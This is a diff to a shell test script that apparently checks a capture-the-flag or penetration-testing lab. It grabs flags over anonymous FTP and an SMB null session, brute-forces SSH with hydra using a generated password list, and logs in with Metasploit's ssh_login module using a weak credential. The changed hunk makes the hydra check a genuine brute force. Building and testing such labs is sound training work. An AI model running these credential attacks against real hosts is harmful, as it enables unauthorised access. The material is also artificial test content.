@@ -13,9 +13,14 @@ fail() { echo "FAIL: $1"; exit 1; }
 A "curl -s ftp://172.28.0.30/pub/flag.txt --user anonymous:anon" | grep -q "FTP-FLAG" || fail "ftp flag"
 # SMB null session read
 A "smbclient //172.28.0.31/public -N -c 'get flag.txt /tmp/smbflag.txt'; cat /tmp/smbflag.txt" | grep -q "SMB-FLAG" || fail "smb flag"
-# SSH weak password via hydra (svc:password123 is line in this tiny list)
-A "printf 'password123\\nletmein\\nadmin\\n' > /tmp/pw.lst; \
-   hydra -l svc -P /tmp/pw.lst -f ssh://172.28.0.32 2>/dev/null" | grep -q "password123" || fail "hydra ssh"
+# SSH weak password via hydra. Bury password123 after 120 wrong candidates and
+# run hydra at its DEFAULT parallelism, so this exercises a real brute force: if
+# the target ever re-hardens (OpenSSH MaxStartups / PerSourcePenalties), hydra's
+# children die on connection errors before reaching the real password and this
+# fails — matching how the SOLUTION's rockyou attack behaves against a hardened box.
+A "python3 -c 'print(chr(10).join(\"wrong%04d\"%i for i in range(120)))' > /tmp/pw.lst; \
+   echo password123 >> /tmp/pw.lst; \
+   hydra -l svc -P /tmp/pw.lst -f ssh://172.28.0.32 2>/dev/null" | grep -q "password: password123" || fail "hydra ssh brute force"
 # Metasploit ssh_login yields a session
 A "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; set USERNAME svc; set PASSWORD password123; set STOP_ON_SUCCESS true; run; exit'" \
   | grep -qi "Success" || fail "msf ssh_login"
